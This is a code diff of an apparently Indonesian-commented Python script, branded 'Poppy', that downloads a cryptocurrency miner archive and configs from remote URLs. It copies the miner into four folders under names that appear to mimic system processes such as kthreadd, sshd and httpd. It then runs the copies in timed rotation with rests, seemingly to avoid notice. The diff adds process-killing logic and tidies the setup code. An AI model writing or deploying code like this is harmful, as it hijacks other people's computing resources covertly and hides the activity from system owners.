@@ -21,7 +21,9 @@ def setup_folders():
 
     # Download dan extract miner
     archive_path = os.path.join(base_path, "cache.tar.gz")
-    if not os.path.exists(os.path.join(base_path, "cache")):
+    extract_path = os.path.join(base_path, "cache")
+
+    if not os.path.exists(extract_path):
         print("[Poppy] Downloading cache.tar.gz...")
         urllib.request.urlretrieve(miner_url, archive_path)
 
@@ -31,24 +33,35 @@ def setup_folders():
 
         os.remove(archive_path)
 
-    # Siapkan 4 folder dan copy miner + config
+    # Copy ke folder kerja
     for i in range(4):
         folder = os.path.join(base_path, str(i + 1))
         os.makedirs(folder, exist_ok=True)
 
-        bin_src = os.path.join(base_path, "cache")
+        bin_src = extract_path
         bin_dst = os.path.join(folder, binary_names[i])
-        shutil.copy2(bin_src, bin_dst)
-        os.chmod(bin_dst, 0o755)
 
+        # Stop proses kalau masih jalan
+        subprocess.run(f"pkill -f {binary_names[i]}", shell=True)
+        time.sleep(1)
+
+        # Copy file miner ke folder
+        if os.path.isfile(bin_src):
+            shutil.copy2(bin_src, bin_dst)
+            os.chmod(bin_dst, 0o755)
+        else:
+            print(f"[Poppy] File bin tidak ditemukan: {bin_src}")
+            continue
+
+        # Download config jika belum ada
         config_path = os.path.join(folder, "config.ini")
         if not os.path.exists(config_path):
             print(f"[Poppy] Downloading config {i+1}...")
             urllib.request.urlretrieve(config_links[i], config_path)
 
-    # Hapus file bin utama setelah copy
+    # Hapus file utama setelah copy
     try:
-        os.remove(os.path.join(base_path, "cache"))
+        os.remove(extract_path)
     except FileNotFoundError:
         pass
 
@@ -71,19 +84,15 @@ def run_rotasi():
 
             time.sleep(run_duration)
 
-            # Kill proses berdasarkan nama binary
             print("[Poppy] Menghentikan proses...")
             subprocess.run(f"pkill -f {binary_names[folder_index]}", shell=True)
             time.sleep(rest_duration)
 
-            # Ganti ke folder selanjutnya
             folder_index = (folder_index + 1) % 4
 
         print("[Poppy] Long rest 10 menit...")
-        subprocess.run("pkill -f kthreadd.", shell=True)
-        subprocess.run("pkill -f systemd-journald.", shell=True)
-        subprocess.run("pkill -f sshd.", shell=True)
-        subprocess.run("pkill -f httpd.", shell=True)
+        for name in binary_names:
+            subprocess.run(f"pkill -f {name}", shell=True)
         time.sleep(long_rest)
 
 # Jalankan semua
